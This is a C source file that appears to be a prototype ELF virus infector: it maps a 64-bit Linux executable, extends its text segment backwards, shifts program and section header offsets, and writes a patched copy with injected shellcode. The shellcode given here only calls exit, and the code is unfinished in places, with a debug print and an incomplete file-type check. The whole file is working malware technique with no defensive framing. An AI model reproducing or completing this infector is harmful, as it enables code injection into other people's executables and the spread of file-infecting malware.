#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <stdio.h>
#include <inttypes.h>

#define ALIGN_UP(arg, alignval) ((arg) % (alignval) ? 			\
			 ((arg) / (alignval) + 1) * (alignval) : (arg))


#define _syscall_wrap(num, ...) syscall(num, __VA_ARGS__)

/*
long _syscall_wrap(long number, ...)
{
	long resultvar;
	asm volatile (
	"movq %%rsi, 	%%rdi	\n\t"
	"movq %%rdx, 	%%rsi	\n\t"
	"movq %%rcx, 	%%rdx	\n\t"
	"movq %%r8, 	%%r10	\n\t"
	"movq %%r9, 	%%r8	\n\t"
	"movq 8(%%rsp),	%%r9	\n\t"
	"syscall		\n\t"
	: "=a" (resultvar)
	: "rax" (number)
	: "memory", "cc", "r11", "cx", "rdi", "rsi", "rdx", "r10", "r8", "r9");
	return resultvar;
}
*/

int _infect_file(const char *target_path, void *body, size_t body_s)
{
	/* Open, mmap */
	int target_fd = _syscall_wrap(SYS_open, target_path, O_RDWR);
	if (target_fd == -1)
		return -1;
	struct stat statbuf;
	if (_syscall_wrap(SYS_fstat, target_fd, &statbuf) == -1)
		return -1;
	char *mem = (void*) _syscall_wrap(SYS_mmap, NULL, statbuf.st_size,
			          PROT_READ | PROT_WRITE, MAP_PRIVATE,
				  target_fd, 0);
	if (mem == MAP_FAILED) {
		_syscall_wrap(SYS_exit, 15);
		return -1;
	}

	Elf64_Ehdr *e_hdr = (Elf64_Ehdr*) mem;
	
	/* Check elf exec */
	if (e_hdr->e_ident[EI_MAG0]  	^ ELFMAG0 	|
	    e_hdr->e_ident[EI_MAG1]  	^ ELFMAG1 	|
	    e_hdr->e_ident[EI_MAG2]  	^ ELFMAG2 	|
	    e_hdr->e_ident[EI_MAG3]  	^ ELFMAG3	|
	    e_hdr->e_ident[EI_CLASS] 	^ ELFCLASS64)			// ET_EXEC too
		return -1;

	Elf64_Phdr *p_hdr_beg = (Elf64_Phdr*) (mem + e_hdr->e_phoff);
	Elf64_Phdr *p_hdr_end = p_hdr_beg + e_hdr->e_phnum;

	size_t load_align;
	Elf64_Phdr *p_hdr_text;

	/* Find text segment */
	for (Elf64_Phdr *p_hdr = p_hdr_beg; p_hdr < p_hdr_end; p_hdr++) {
		if (p_hdr->p_type  == PT_LOAD && 
		    p_hdr->p_flags == (PF_R | PF_X)) {
			p_hdr_text = p_hdr;
			load_align = p_hdr->p_align;
			p_hdr->p_vaddr  -= ALIGN_UP(body_s, load_align);
			p_hdr->p_paddr  -= ALIGN_UP(body_s, load_align);
			p_hdr->p_filesz += ALIGN_UP(body_s, load_align);
			p_hdr->p_memsz  += ALIGN_UP(body_s, load_align);
			break;
		}
	}

	/* Shift segments */
	for (Elf64_Phdr *p_hdr = p_hdr_beg; p_hdr < p_hdr_end; p_hdr++) {
		if (p_hdr->p_offset > p_hdr_text->p_offset) {
			printf("1\n");
			p_hdr->p_offset += ALIGN_UP(body_s, load_align);
		}
	}
	
	/* Shift sections */
	Elf64_Shdr *s_hdr = (Elf64_Shdr*) (mem + e_hdr->e_shoff);
	for (uint16_t i = e_hdr->e_shnum; i > 0; i--, s_hdr++)
		s_hdr->sh_offset += ALIGN_UP(body_s, load_align);

	e_hdr->e_phoff += ALIGN_UP(body_s, load_align);
	e_hdr->e_shoff += ALIGN_UP(body_s, load_align);

	_syscall_wrap(SYS_close, target_fd);

	int out_fd = _syscall_wrap(SYS_creat, "out.out", statbuf.st_mode);

	_syscall_wrap(SYS_write, out_fd, mem, sizeof(*e_hdr));
	_syscall_wrap(SYS_write, out_fd, body, body_s);
	_syscall_wrap(SYS_lseek, out_fd, sizeof(*e_hdr) + ALIGN_UP(body_s, load_align), SEEK_SET);
	_syscall_wrap(SYS_write, out_fd, mem + sizeof(*e_hdr), statbuf.st_size - sizeof(*e_hdr));

	_syscall_wrap(SYS_close, out_fd);

	return 0;
}

int main(int argc, char *argv[])
{
	uint64_t code = 0xdeadbeef;
	char str_exit[] = "\x48\xC7\xC0\x3C\x00\x00\x00\x48\xC7\xC7\x3C\x00\x00\x00\x0F\x05";
	return (int) _infect_file(argv[1], &str_exit, sizeof(str_exit));
}
